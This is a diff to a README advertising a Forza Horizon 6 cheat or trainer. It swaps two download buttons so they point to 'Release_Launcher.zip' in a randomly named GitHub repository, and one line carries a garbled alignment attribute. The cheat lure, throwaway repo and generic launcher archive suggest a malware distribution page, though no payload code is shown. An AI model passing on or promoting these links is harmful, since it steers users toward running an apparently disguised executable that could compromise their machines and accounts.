@@ -41,7 +41,7 @@ But Forza Horizon 6 is **a grind**. The **credits** take forever to earn. The **
 ## 🔗 Download
 
 <p align="324weqscenter">
-  <a href="https://StokerNurse94.github.io/Forza-6-Trainer/">
+  <a href="https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
   <br><br>
@@ -224,7 +224,7 @@ The cheat ships with a full-featured config system — every setting can be save
 
 ## 📥 Download Forza Horizon 6 Hack 2026
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-FF4500?style=for-the-badge&logo=download&logoColor=white)](https://StokerNurse94.github.io/Forza-6-Trainer/)
+[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-FF4500?style=for-the-badge&logo=download&logoColor=white)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
 
 ---
 
